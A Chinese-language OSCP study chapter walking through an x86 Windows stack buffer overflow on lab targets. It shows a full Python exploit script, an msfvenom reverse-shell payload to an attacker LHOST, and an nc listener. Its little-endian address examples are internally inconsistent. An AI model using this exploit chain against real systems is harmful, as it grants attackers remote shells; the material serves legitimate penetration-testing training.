# Ch 37 — Buffer Overflow（x86 Windows）：EIP 控制到 shellcode

> 目標：理解 x86 Stack Buffer Overflow 的原理，能在 Windows 靶機上找到 EIP offset，找壞字元，找跳板，放入 shellcode 取得反彈 shell。

## 什麼是 Stack Buffer Overflow

```c
// 有漏洞的程式
void vuln_function(char *input) {
    char buffer[100];
    strcpy(buffer, input);   // 沒有邊界檢查！
}
```

Stack 的記憶體佈局：

```
高位址  [saved EIP]  ← 函數返回後跳到的地址
        [saved EBP]  ← 舊的 EBP
        [buffer]     ← 100 bytes
低位址
```

當你輸入 120 bytes，`strcpy` 會覆蓋到 `saved EIP`——你控制了程式接下來執行的地址。

## 工具準備

- **Immunity Debugger**（在 Windows 靶機上，或分析 PoC 時用）
- **mona.py**（Immunity Debugger 的插件）
- **Python 3**（寫 exploit 腳本）
- **pwntools**（可選）

## OSCP BoF 的 7 個步驟

### Step 1：找 offset（EIP 偏移量）

確認「需要多少 bytes 才能覆蓋到 EIP」。

```bash
# 生成循環字串（每段都唯一，方便定位）
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
# 或
python3 -c "import pwn; print(pwn.cyclic(3000).decode())"
```

把這個字串發送給程式，當它 crash 時，EIP 的值就是一個子字串。

```python
# exploit.py
import socket

payload = "Aa0Aa1Aa2Aa3..."  # pattern_create 的輸出

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.10.x", 9999))
s.recv(1024)
s.send(payload.encode())
s.close()
```

在 Immunity Debugger 裡，程式 crash 後看 EIP 的值，用 pattern_offset 找 offset：

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q <EIP值>
# 輸出：[*] Exact match at offset 2003
```

### Step 2：驗證 offset

```python
offset = 2003
payload = b"A" * offset + b"B" * 4 + b"C" * 100

# 如果 EIP = 0x42424242（BBBB），offset 正確
```

### Step 3：找壞字元（Bad Characters）

某些字元會破壞 payload（如 `\x00` = null byte，截斷字串）。

```python
# 生成所有字元（除了 \x00）
badchars = b""
for i in range(0x01, 0x100):
    badchars += bytes([i])

payload = b"A" * offset + b"B" * 4 + badchars
```

在 Immunity Debugger 裡，看 ESP 指向的記憶體，找哪些字元被改變或後面的字元消失了。

用 mona.py：

```
!mona bytearray -b "\x00"           # 生成參考 bytearray
!mona compare -f bytearray.bin -a <ESP地址>  # 比較，找壞字元
```

逐一排除，直到沒有更多壞字元。

### Step 4：找 JMP ESP 跳板

你不能直接把 shellcode 地址寫進 EIP（ASLR / 地址不確定）。但可以找一個**穩定的 `JMP ESP` 指令**的地址，讓它跳到你放在 ESP 的 shellcode。

```
# 在 Immunity 用 mona 搜尋 JMP ESP
!mona jmp -r esp -cpb "\x00\x0a\x0d"   # -cpb = 排除壞字元

# 輸出一組地址，選一個 DLL 裡的（ASLR/Rebase/Safe SEH 都是 False 的優先）
```

### Step 5：生成 shellcode

```bash
msfvenom -p windows/shell_reverse_tcp \
    LHOST=10.10.14.5 \
    LPORT=4444 \
    -f py \
    -b "\x00\x0a\x0d"    # 排除壞字元
    -e x86/shikata_ga_nai  # 編碼器（某些情況需要）

# 輸出一個 Python bytes 物件：
buf = b"\xdb\xc0\xd9\x74\x24\xf4..."
```

### Step 6：組合 exploit

```python
import socket

offset = 2003
jmp_esp = b"\x37\x91\x43\x62"  # JMP ESP 地址，小端序
nop_sled = b"\x90" * 16         # NOP sled（讓 shellcode 有緩衝）
buf = b"\xdb\xc0..."            # msfvenom 的 shellcode

payload = b"A" * offset + jmp_esp + nop_sled + buf

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.10.x", 9999))
s.recv(1024)
s.send(payload)
s.close()
```

### Step 7：觸發

```bash
# 先在 Kali 開監聽
nc -nvlp 4444

# 執行 exploit
python3 exploit.py

# 拿到 shell！
```

## OSCP BoF 的典型靶機

### TryHackMe Buffer Overflow Prep

這個 THM 房間有 10 個 OSCP 風格的 BoF 練習，是 OSCP 備考的標準練習：

```
OVERFLOW1–OVERFLOW10
每個都是不同的 offset 和壞字元
練習目標：熟悉到一個 BoF 在 20–30 分鐘內完成
```

### Vulnserver（本地練習）

```bash
# 下載 Vulnserver 到你的 Windows VM
# nc 10.10.10.x 9999 連接
# 發送 TRUN 命令測試 BoF
```

## 關鍵技巧

### 不確定 offset 時加 NOP

在 JMP ESP 和 shellcode 之間放 `\x90`（NOP，No Operation）：

```python
payload = b"A" * offset + jmp_esp + b"\x90" * 32 + shellcode
```

NOP sled 讓 shellcode 有更大的命中範圍。

### 小端序（Little-Endian）

x86 的地址是反著存的。地址 `0x6234913` 要寫成：

```python
import struct
jmp_esp = struct.pack("<I", 0x62349137)
# 或直接反寫：b"\x37\x91\x34\x62"
```

## 本章對應靶機

| 靶機 | 說明 |
|------|------|
| THM Buffer Overflow Prep | 10 個 OSCP 風格練習，必練！ |
| THM Brainstorm | 完整的遠端 BoF，有 Immunity Debugger |
| HTB StenoBack | OSCP 風格 Windows BoF |

## 自我檢核

- [ ] 知道 Stack Buffer Overflow 的記憶體佈局（buffer → EBP → EIP）
- [ ] 能用 pattern_create/offset 找 EIP offset
- [ ] 能用 mona 找壞字元和 JMP ESP 地址
- [ ] 能組合完整 exploit（offset + JMP ESP + NOP sled + shellcode）
- [ ] 在 THM Buffer Overflow Prep 完成至少 3 個練習

→ [Ch 38 Pivoting + Port Forwarding：Chisel / SSH tunnel](./38-pivoting.md)
